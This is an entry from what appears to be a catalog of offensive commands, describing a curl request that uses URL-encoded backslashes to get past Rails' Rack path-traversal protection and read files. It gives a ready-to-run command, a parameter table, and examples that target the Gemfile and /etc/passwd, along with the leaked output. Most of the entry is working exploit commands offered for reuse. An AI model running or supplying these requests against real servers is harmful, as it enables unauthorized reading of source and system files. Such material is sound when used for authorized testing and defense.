---
data: 'curl -X GET "http://localhost:3000/help/%5c../%5c../%5c../Gemfile" -v'
tags:
  - http
  - bypass
  - traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.353Z'
id: 7113207f-430e-4c27-a6b7-6c4487f119d0
verified: false
validated: true
submitted: true
---
# curl-encoded-backslash-traversal

## Command

```bash
curl -X GET "http://localhost:3000/help/%5c../%5c../%5c../Gemfile" -v
```

## Description

Sends an HTTP GET with URL-encoded backslashes to bypass Rack::Protection::PathTraversal and exploit directory traversal in Rails view resolver.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -X GET | HTTP method | Yes |
| URL | Encoded path (e.g., %5c for \) | Yes |
| -v | Verbose for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target/help/%5c../%5c../Gemfile"
```

### Advanced Usage

```bash
curl -X GET "http://target/help/%5c../%5c../%5c../etc/passwd" --header "Host: target.com"
```

## Expected Output

< HTTP/1.1 200 OK
...
source "https://rubygems.org"
...

## Related

- [[Related Procedure]]
